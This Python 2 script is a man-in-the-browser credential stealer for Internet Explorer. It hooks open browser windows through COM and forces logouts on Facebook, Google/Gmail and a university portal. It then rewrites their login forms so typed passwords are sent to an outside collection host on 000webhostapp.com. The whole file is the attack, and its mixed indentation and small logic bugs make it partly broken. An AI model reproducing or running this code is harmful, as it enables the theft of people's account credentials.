import win32com.client
import time 
import urlparse
import urllib
import threading
import pythoncom

target_sites = {}

def wait_for_browser(browser):
    # wait for the browser to finish loadding a page
	while browser .ReadyState != 4 and browser.ReadyState != "complete":
	   time.sleep(0.1)
	   return

	   
def mitb(windows):
 global target_sites
 while True:
   for browser in windows:
      url = urlparse.urlparse(browser.LocationUrl)
      print url.hostname
      if url.hostname in target_sites:
        if target_sites[url.hostname]["owned"]:
		continue
	if target_sites[url.hostname]["logout_url"]:
		    browser.Navigate(target_sites[url.hostname]["logout_url"])
		    wait_for_browser(browser)
	else:
		    # retrieve all elements in the document
	        full_doc = browser.Document.all
		    # iterate , looking for logout_form
	     	for i in full_doc:
	          try:
                    if i.id == target_sites[url.hostname]["logout_form"]:
                       i.submit()
                       wait_for_browser(browser)
                  except:
                    pass			
			  
# Now modify the login form!!!	  
			  
        try:	  
         login_index = target_sites[url.hostname]["login_form_index"]
         
         login_page = urllib.quote(browser.LocationUrl)
         if url.hostname == "www.facebook.com" or url.hostname == "m.facebook.com":
             data_reciever = "https://psyberlupus.000webhostapp.com/site.php?site=www.facebook.com&"
             print "Changing action %s%s" % (data_reciever,login_page) 
             browser.Document.forms[login_index].action = "%s%s" % (data_reciever,login_page) 
             target_sites[url.hostname]["owned"] = False
             print "Sent!!!"
         if url.hostname == "upes.winnou.net":
             data_reciever = "https://psyberlupus.000webhostapp.com/site.php?site=upes.winnou.net&"
             print "Changing action %s%s" % (data_reciever,login_page) 
             browser.Document.forms[login_index].action = "%s%s" % (data_reciever,login_page) 
             target_sites[url.hostname]["owned"] = False
             print "Sent!!! UPES"
         if url.hostname == "accounts.google.com":
              print "checking"
              data_reciever = "https://psyberlupus.000webhostapp.com/site.php?site=accounts.google.com&"
              print "Changing action %s%s" % (data_reciever,login_page) 
              browser.Document.forms[login_index].action = "%s%s" % (data_reciever,login_page) 
              target_sites[url.hostname]["owned"] = False
              print "Never Here!!!"
              
        except:
	 pass

      time.sleep(0) 

def run(**args):
 print "Screwing Internet Explorer!!!"
 global target_sites
 target_sites = {}
 target_sites["www.facebook.com"] = \
     {"logout_url"      : None, 
      "logout_form"     : "logout_form", 
      "login_form_index": 0, 
      "owned"           : False} 
  

 target_sites["upes.winnou.net"] = \
     {"logout_url"      : None, 
      "logout_form"     : "logout_form", 
      "login_form_index": 0, 
      "owned"           : False} 


 target_sites["accounts.google.com"]    = \
     {"logout_url"       : "https://accounts.google.com/Logout?hl=en&continue=https://accounts.google.com/ServiceLogin%3Fservice%3Dmail", 
      "logout_form"      : None, 
      "login_form_index" : 0, 
      "owned"            : False} 

# Use same target for multiple gmail domains
 target_sites["www.gmail.com"] = target_sites["accounts.google.com"]
 target_sites["mail.google.com"] = target_sites["accounts.google.com"]
 target_sites["m.facebook.com"] = target_sites["www.facebook.com"]
 clsid = '{9BA05972-F6A8-11CF-A442-00A0C90A8F39}'
 windows = win32com.client.Dispatch(clsid)

 mitb(windows)
 return str("started")
 

run()
 
